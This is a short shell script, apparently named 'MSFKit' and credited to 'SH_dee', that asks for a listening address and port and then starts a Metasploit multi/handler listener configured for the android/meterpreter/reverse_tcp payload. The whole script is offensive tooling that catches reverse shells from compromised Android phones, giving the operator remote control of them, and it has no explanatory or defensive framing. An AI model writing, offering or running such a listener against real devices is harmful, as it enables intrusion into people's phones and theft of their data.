#!/bin/sh
clear
echo " __  __ ____  _____ _  ___ _  
|  \/  / ___||  ___| |/ (_) |_ 
| |\/| \___ \| |_  | ' /| | __|
| |  | |___) |  _| | . \| | |_ 
|_|  |_|____/|_|   |_|\_\_|\__|\n"

echo " ----------By SH_dee----------\n"
read -p " [*] Enter your LHOST : " IP 
read -p " [*] Enter your PORT : " PORT 
echo "\n\n=========== STARTING console ......wait for a second. ==========\n\n"

msfconsole -x "use exploit/multi/handler; set LHOST $IP; set LPORT $PORT; set PAYLOAD android/meterpreter/reverse_tcp; clear; exploit"

